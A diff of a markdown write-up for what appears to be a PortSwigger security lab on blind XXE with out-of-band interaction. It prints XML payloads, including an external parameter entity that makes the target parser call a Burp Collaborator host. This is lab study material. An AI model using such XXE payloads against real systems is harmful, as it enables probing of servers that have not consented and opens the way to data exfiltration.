@@ -18,7 +18,6 @@ date: 2023-05-08
 
 ## Recon
 * Create a new entity and reference it
-    :::spoiler Payload
     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE test [ <!ENTITY xxe "test"> ]>
@@ -31,14 +30,12 @@ date: 2023-05-08
         </storeId>
     </stockCheck>
     ```
-    :::
     ![](https://hackmd.io/_uploads/H1hEjtUNh.png)
     Seems not work properly...
 
 
 ## Exp
 * Use Parameter Entity
-    :::spoiler Payload
     ```xml
     <?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://a1cby8s3b3bvzxlb8cfaw4jvqmwfk4.burpcollaborator.net"> %xxe; ]>
@@ -51,15 +48,11 @@ date: 2023-05-08
         </storeId>
     </stockCheck>
     ```
-    :::
 
-:::spoiler Success Screenshot
 ![](https://hackmd.io/_uploads/rJh0sYLEn.png)
 
----
 ![](https://hackmd.io/_uploads/rk7H2FL42.png)
-:::
 
 ## Reference
-[XXE Lab Breakdown: Blind XXE with out-of-band interaction via XML parameter entities](https://youtu.be/xjcSMFKVTW4)
-[Lab: Blind XXE with out-of-band interaction via XML parameter entities](https://www.cnblogs.com/Zeker62/p/15190054.html)
+* [XXE Lab Breakdown: Blind XXE with out-of-band interaction via XML parameter entities](https://youtu.be/xjcSMFKVTW4)
+* [Lab: Blind XXE with out-of-band interaction via XML parameter entities](https://www.cnblogs.com/Zeker62/p/15190054.html)
